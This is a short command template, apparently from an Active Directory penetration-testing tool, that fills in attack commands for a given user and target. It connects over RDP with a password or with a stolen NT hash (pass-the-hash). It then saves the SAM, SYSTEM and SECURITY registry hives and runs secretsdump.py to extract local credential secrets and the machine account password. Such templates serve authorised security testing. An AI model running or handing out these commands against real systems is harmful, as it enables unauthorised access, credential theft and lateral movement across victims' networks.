# Connect to RDP (if opened) as {{parent}} on {{target}}
{% if parent.krb_auth or parent.secret_type == T_SECRET_AESKEY %}
xfreerdp KRB TODO
{%- elif parent.secret_type == T_SECRET_NTHASH %}
xfreerdp /d:{{fqdn}} /u:{{parent}} /pth:{{parent.secret|red}} /v:{{target_ip|red}}
{%- elif parent.secret_type == T_SECRET_PASSWORD %}
xfreerdp /d:{{fqdn}} /u:{{parent}} /p:{{parent.secret|red}} /v:{{target_ip|red}}
{% endif %}

# Save hives in a writable directory, then retrieve them with smbclient
# run a cmd 'as administrator' to see the SeBackup privilege
cd C:\Windows\Temp
reg save HKLM\SAM SAM.save
reg save HKLM\SYSTEM SYSTEM.save
reg save HKLM\SECURITY SECURITY.save

# Extract secrets (take the $MACHINE.ACC:plain_password_hex)
secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save local
